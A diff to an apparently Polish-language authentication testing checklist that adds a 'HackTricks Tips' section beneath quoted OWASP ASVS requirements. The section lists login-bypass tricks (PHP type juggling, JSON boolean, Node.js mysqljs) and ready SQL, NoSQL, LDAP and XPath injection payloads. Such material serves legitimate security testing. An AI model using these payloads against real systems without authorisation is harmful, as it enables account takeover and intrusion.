@@ -236,3 +236,22 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 |---|---|---|
 | V6.3.4 | General Authentication Security | Verify that, if the application includes multiple authentication pathways, there are no undocumented pathways and that security controls and authentication strength are enforced consistently. |
 | V6.1.3 | Authentication Documentation | Verify that, if the application includes multiple authentication pathways, these are all documented together with the security controls and authentication strength which must be consistently enforced across them. |
+
+
+---
+
+## HackTricks Tips
+
+### Login Bypass
+
+- **Brak parametrów**: wyślij pusty request lub tylko jeden parametr
+- **PHP type juggling**: `user[]=a&pwd=b` lub `user=a&pwd[]=b`
+- **JSON boolean**: `{"username":"admin","password":true}` (zmień Content-Type na `application/json`)
+- **Node.js/mysqljs**: `password[password]=1` → evaluates jako `password=password=1` (always true)
+
+### Injection Auth Bypass
+
+- **SQL**: `' or '1'='1`, `admin'--`, `admin' or 1=1--`
+- **NoSQL**: `{"username":"admin","password":{"$gt":""}}`
+- **LDAP**: `*`, `*)(&`, `admin)(&)`
+- **XPath**: `' or '1'='1`, `' or true() or '`
